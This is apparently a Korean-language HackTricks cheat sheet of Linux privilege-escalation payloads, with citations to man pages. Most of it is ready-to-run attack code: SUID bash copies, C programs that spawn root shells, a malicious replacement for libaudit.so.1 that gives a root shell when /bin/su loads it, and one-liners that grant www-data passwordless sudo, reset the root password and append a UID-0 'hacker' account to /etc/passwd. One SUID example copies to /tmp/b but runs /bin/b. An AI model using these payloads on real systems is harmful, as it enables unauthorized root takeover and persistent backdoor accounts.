# 실행할 Payload

## Bash

`bash -p`는 privileged mode를 활성화합니다. Bash가 서로 다른 real ID와 effective ID로 시작되면 effective ID를 real ID로 재설정하지 않습니다. 결과 셸은 여전히 호출자의 기존 credentials에 의존합니다.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid`는 권한이 허용될 때 real, effective, saved ID를 변경하며, `setuid`는 effective ID를 변경하고 권한 있는 호출자에 대해서는 real 및 saved ID도 설정할 수 있습니다. `execve`는 현재 프로세스 이미지를 요청된 프로그램으로 교체합니다.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> 이러한 예제에서는 반환 값 확인을 생략합니다. 두 credential 호출 모두 UID 0에서도 실패할 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## 파일을 덮어써 권한 상승

### 일반적인 파일

다음은 일반적인 로컬 권한 제어 파일 및 인터페이스입니다. `/etc/passwd`는 7개 필드로 구성된 계정 레코드를 저장하고, `/etc/shadow`는 선택적 암호화 비밀번호 데이터를 저장하며, `sudoers`는 `NOPASSWD`와 같은 태그 및 sudo 권한을 정의합니다. Docker의 기본 daemon endpoint는 `/var/run/docker.sock`에 있는 Unix socket이며, 해당 socket에 액세스하면 호스트를 root 수준으로 제어할 수 있습니다.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 비밀번호가 설정된 사용자를 _/etc/passwd_에 추가
- _/etc/shadow_의 비밀번호 변경
- _/etc/sudoers_의 sudoers에 사용자 추가
- 일반적으로 _/run/docker.sock_ 또는 _/var/run/docker.sock_에 있는 docker socket을 통해 Docker 악용

### 라이브러리 덮어쓰기

바이너리가 사용하는 shared library를 확인합니다. 이 예제에서는 `ldd`를 사용해 `/bin/su`를 검사합니다.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd`는 shared-object 종속성을 보고하는 반면, dynamic linker는 ELF metadata와 검색 규칙을 사용하여 런타임에 이를 로드합니다.<sup>[[9]](#references)[[10]](#references)</sup>

하나의 후보를 검사하려면 `objdump -T`를 사용하여 `su`의 dynamic symbol table을 출력하고 audit 이름을 필터링합니다.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message`, `audit_log_acct_message`는 libaudit 함수이며, 이 출력에서는 `audit_fd`가 `su`의 `.bss`에 정의된 data object로 표시됩니다.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> replacement library는 loader가 resolve하는 undefined symbols에 대해 호환 가능한 definitions를 export해야 합니다. 이러한 symbols가 relocate되거나 call될 때 function/data ABI가 일치하지 않으면 process가 여전히 fail할 수 있습니다.<sup>[[10]](#references)[[11]](#references)</sup>

GCC의 `constructor` attribute를 사용하면 지원되는 target에서 `main`보다 먼저 `inject`가 자동으로 call됩니다.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
교체된 파일이 권한 있는 **`/bin/su`** 프로세스에 의해 성공적으로 로드되면, 이 constructor는 해당 프로세스의 권한으로 **`/bin/bash`**를 시작할 수 있습니다. 정확한 결과는 환경에 따라 달라집니다.<sup>[[10]](#references)[[15]](#references)</sup>

## 스크립트

root 권한으로 무언가를 실행하게 만들 수 있을까요?

`sudoers`는 정책 항목에서 `NOPASSWD` 태그를 사용하고, `chpasswd`는 표준 입력에서 `user:password` 쌍을 읽으며, `/etc/passwd`는 콜론으로 구분된 7개의 계정 필드를 사용합니다. 다음 예제에서는 관련 파일이 해당 파일을 실행하는 프로세스에 의해 쓰기 가능하다고 가정합니다.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data에서 sudoers로**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **root password 변경**
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd에 새로운 root 사용자 추가

최종 payload는 생성된 `crypt` hash를 허용하는 target에 따라 달라집니다. Debian의 `mkpasswd -m sha-512`는 SHA-512 crypt (`$6$`)에 매핑되는 반면, OpenSSL의 `passwd -1 -salt`는 MD5 기반 BSD algorithm (`$1$`)을 사용합니다.<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Set 내장 명령어 (Bash Reference Manual)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian 매뉴얼 페이지](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Docker daemon socket 보호](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker 문서](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian 매뉴얼 페이지](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian 매뉴얼 페이지](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian 매뉴얼 페이지](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [공통 속성 (GNU Compiler Collection 사용)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian 소스](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL 문서](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
